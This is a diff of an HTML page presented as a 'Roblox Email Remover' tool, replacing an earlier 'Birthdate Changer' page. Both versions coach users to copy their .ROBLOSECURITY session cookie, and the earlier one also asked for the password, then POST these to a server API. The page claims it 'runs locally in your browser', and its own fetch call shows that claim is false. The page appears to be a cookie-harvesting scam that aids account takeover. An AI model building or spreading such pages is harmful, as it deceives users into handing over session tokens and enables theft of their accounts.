@@ -1,13 +1,14 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Roblox Birthdate Changer Tool</title>
+  <title>Roblox Email Remover Tool</title>
   <style>
     * {
       box-sizing: border-box;
     }
-
+    
     body {
       background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -18,19 +19,19 @@
       margin: 0;
       padding: 20px;
     }
-
+    
     .container {
       background: white;
       padding: 40px;
       border-radius: 20px;
       box-shadow: 0 20px 40px rgba(0,0,0,0.1);
       width: 100%;
-      max-width: 500px;
+      max-width: 600px;
       text-align: center;
       position: relative;
       overflow: hidden;
     }
-
+    
     .container::before {
       content: '';
       position: absolute;
@@ -40,20 +41,20 @@
       height: 4px;
       background: linear-gradient(90deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4);
     }
-
+    
     h1 {
       color: #2c3e50;
       margin-bottom: 10px;
       font-size: 28px;
       font-weight: 700;
     }
-
+    
     .subtitle {
       color: #7f8c8d;
       margin-bottom: 30px;
       font-size: 16px;
     }
-
+    
     .warning {
       background: #fff3cd;
       border: 1px solid #ffeaa7;
@@ -63,56 +64,38 @@
       color: #856404;
       font-size: 14px;
     }
-
-    .info {
-      background: #e3f2fd;
-      border: 1px solid #bbdefb;
-      border-radius: 10px;
-      padding: 15px;
-      margin-bottom: 25px;
-      color: #1976d2;
-      font-size: 14px;
-    }
-
+    
     .input-group {
       margin-bottom: 25px;
       text-align: left;
     }
-
+    
     label {
       display: block;
       margin-bottom: 8px;
       color: #2c3e50;
       font-weight: 600;
     }
-
-    textarea, input {
+    
+    textarea {
       width: 100%;
+      height: 140px;
       padding: 15px;
       border: 2px solid #e1e8ed;
       border-radius: 12px;
-      font-size: 14px;
-      transition: border-color 0.3s ease;
-      background: #f8f9fa;
-    }
-
-    textarea {
-      height: 120px;
       resize: none;
       font-family: monospace;
       font-size: 12px;
+      transition: border-color 0.3s ease;
+      background: #f8f9fa;
     }
-
-    input[type="password"] {
-      font-family: inherit;
-    }
-
-    textarea:focus, input:focus {
+    
+    textarea:focus {
       outline: none;
       border-color: #667eea;
       background: white;
     }
-
+    
     .btn {
       padding: 15px 30px;
       background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
@@ -127,18 +110,18 @@
       overflow: hidden;
       min-width: 180px;
     }
-
+    
     .btn:hover {
       transform: translateY(-2px);
       box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
     }
-
+    
     .btn:disabled {
       opacity: 0.6;
       cursor: not-allowed;
       transform: none;
     }
-
+    
     .status {
       margin-top: 25px;
       padding: 15px;
@@ -150,31 +133,31 @@
       align-items: center;
       justify-content: center;
     }
-
+    
     .status.loading {
       background: #e3f2fd;
       color: #1976d2;
       border: 2px solid #bbdefb;
     }
-
+    
     .status.success {
       background: #e8f5e8;
       color: #2e7d32;
       border: 2px solid #c8e6c9;
     }
-
+    
     .status.error {
       background: #ffebee;
       color: #c62828;
       border: 2px solid #ffcdd2;
     }
-
+    
     .status.warning {
       background: #fff8e1;
       color: #f57c00;
       border: 2px solid #ffecb3;
     }
-
+    
     .spinner {
       width: 20px;
       height: 20px;
@@ -184,12 +167,12 @@
       animation: spin 1s linear infinite;
       margin-right: 10px;
     }
-
+    
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
+    
     .cookie-info {
       background: #f8f9fa;
       border-radius: 10px;
@@ -199,17 +182,17 @@
       font-size: 13px;
       color: #495057;
     }
-
+    
     .cookie-info h4 {
       margin: 0 0 10px 0;
       color: #343a40;
     }
-
+    
     .cookie-info ol {
       margin: 10px 0;
       padding-left: 20px;
     }
-
+    
     .hidden {
       display: none;
     }
@@ -217,17 +200,13 @@
 </head>
 <body>
   <div class="container">
-    <h1>🎂 Roblox Birthdate Changer</h1>
-    <p class="subtitle">Automatically changes birthdate to January 1, 2013</p>
-
+    <h1>🔧 Roblox Email Remover</h1>
+    <p class="subtitle">Remove email addresses from Roblox accounts</p>
+    
     <div class="warning">
-      ⚠️ <strong>Security Warning:</strong> Never share your .ROBLOSECURITY cookie or password with untrusted sources. This tool runs locally in your browser.
+      ⚠️ <strong>Security Warning:</strong> Never share your .ROBLOSECURITY cookie with untrusted sources. This tool runs locally in your browser.
     </div>
-
-    <div class="info">
-      ℹ️ <strong>Auto-Configuration:</strong> Birthdate will be automatically set to January 1, 2013 when you submit the form.
-    </div>
-
+    
     <div class="cookie-info">
       <h4>📋 How to get your .ROBLOSECURITY cookie:</h4>
       <ol>
@@ -238,8 +217,8 @@
         <li>Paste it below (with or without the .ROBLOSECURITY= prefix)</li>
       </ol>
     </div>
-
-    <form id="changeBirthdateForm">
+    
+    <form id="removeForm">
       <div class="input-group">
         <label for="cookieInput">🍪 .ROBLOSECURITY Cookie</label>
         <textarea 
@@ -252,32 +231,21 @@ Example formats accepted:
           required
         ></textarea>
       </div>
-
-      <div class="input-group">
-        <label for="passwordInput">🔒 Account Password</label>
-        <input 
-          type="password" 
-          id="passwordInput" 
-          placeholder="Enter your Roblox account password"
-          required
-        />
-      </div>
-
+      
       <button type="submit" class="btn" id="submitBtn">
-        🎂 Change Birthdate to Jan 1, 2013
+        🚀 Remove Email
       </button>
     </form>
-
+    
     <div id="status" class="status hidden"></div>
   </div>
 
   <script>
-    const form = document.getElementById('changeBirthdateForm');
+    const form = document.getElementById('removeForm');
     const cookieInput = document.getElementById('cookieInput');
-    const passwordInput = document.getElementById('passwordInput');
     const submitBtn = document.getElementById('submitBtn');
     const status = document.getElementById('status');
-
+    
     function showStatus(type, message, showSpinner = false) {
       status.className = `status ${type}`;
       status.innerHTML = showSpinner 
@@ -285,31 +253,31 @@ Example formats accepted:
         : message;
       status.classList.remove('hidden');
     }
-
+    
     function hideStatus() {
       status.classList.add('hidden');
     }
-
+    
     function validateCookie(cookie) {
       cookie = cookie.trim();
-
+      
       // Remove prefix if present
       if (cookie.includes('.ROBLOSECURITY=')) {
         cookie = cookie.split('.ROBLOSECURITY=')[1];
       }
-
+      
       // Basic validation
       if (cookie.length < 50) {
         return { valid: false, message: 'Cookie appears too short to be valid' };
       }
-
+      
       if (!cookie.includes('_|WARNING:')) {
         return { valid: false, message: 'Cookie format doesn\'t match expected Roblox format' };
       }
-
+      
       return { valid: true, cookie: cookie };
     }
-
+    
     cookieInput.addEventListener('input', () => {
       const cookie = cookieInput.value.trim();
       if (cookie) {
@@ -323,65 +291,54 @@ Example formats accepted:
         hideStatus();
       }
     });
-
+    
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-
+      
       const cookie = cookieInput.value.trim();
-      const password = passwordInput.value.trim();
-
+      
       if (!cookie) {
         showStatus('error', '❌ Please enter your .ROBLOSECURITY cookie');
         return;
       }
-
-      if (!password) {
-        showStatus('error', '❌ Please enter your account password');
+      
+      const validation = validateCookie(cookie);
+      if (!validation.valid) {
+        showStatus('error', `❌ ${validation.message}`);
         return;
       }
-
-      const cookieValidation = validateCookie(cookie);
-      if (!cookieValidation.valid) {
-        showStatus('error', `❌ ${cookieValidation.message}`);
-        return;
-      }
-
+      
       submitBtn.disabled = true;
-      showStatus('loading', 'Changing your birthdate to January 1, 2013...', true);
-
+      showStatus('loading', 'Processing your request...', true);
+      
       try {
-        const res = await fetch('/api/change-birthdate', {
+        const res = await fetch('/api/remove-email', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
           },
-          body: JSON.stringify({ 
-            cookie: cookieValidation.cookie,
-            password: password
-          })
+          body: JSON.stringify({ cookie: validation.cookie })
         });
-
+        
         const data = await res.json();
-
+        
         if (res.ok) {
           showStatus('success', `✅ ${data.message}`);
-          // Clear password field for security
-          passwordInput.value = '';
         } else {
           let errorMsg = data.error || 'Something went wrong';
-
+          
           // Handle challenge responses
           if (data.needsChallenge) {
-            errorMsg = `🔐 Two-factor authentication required. Challenge ID: ${data.challengeId}. Please complete the verification and try again.`;
+            errorMsg = `🔐 Two-factor authentication required. Challenge ID: ${data.challengeId}. Please complete the verification and try again with manual challenge handling.`;
             console.log('Challenge details:', data);
           } else if (errorMsg.includes('Challenge is required')) {
             errorMsg = '🔐 2FA verification required by Roblox. This may require manual verification through Roblox directly.';
           } else if (errorMsg.includes('Invalid cookie')) {
             errorMsg = '🍪 Invalid cookie format. Please check your .ROBLOSECURITY cookie.';
-          } else if (errorMsg.includes('password')) {
-            errorMsg = '🔒 Invalid password. Please check your account password.';
+          } else if (errorMsg.includes('No email linked')) {
+            errorMsg = '📧 No email found linked to this account.';
           }
-
+          
           showStatus('error', `❌ ${errorMsg}`);
         }
       } catch (err) {
